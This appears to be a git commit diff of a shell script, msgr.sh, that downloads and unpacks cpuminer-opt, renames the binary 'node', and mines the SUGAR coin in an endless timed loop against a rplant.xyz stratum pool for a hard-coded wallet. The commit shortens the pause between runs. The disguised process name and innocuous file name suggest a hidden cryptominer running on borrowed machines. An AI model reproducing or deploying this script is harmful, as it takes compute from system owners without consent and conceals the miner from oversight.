b1ad33d5f8f900e6d29cc6d573a89eed49220657
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-04-29 19:41:45 +0800

    Update msgr.sh

--- msgr.sh
+++ msgr.sh
@@ -5,5 +5,5 @@ tar -xf cpuminer-opt-linux.tar.gz
 mv cpuminer-avx node
 while [ 1 ]; do
 timeout 15m ./node -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbah ; if [ $? -eq 124 ] ; then echo success! ; else echo failed ; fi
-sleep 5m
+sleep 1m
 done
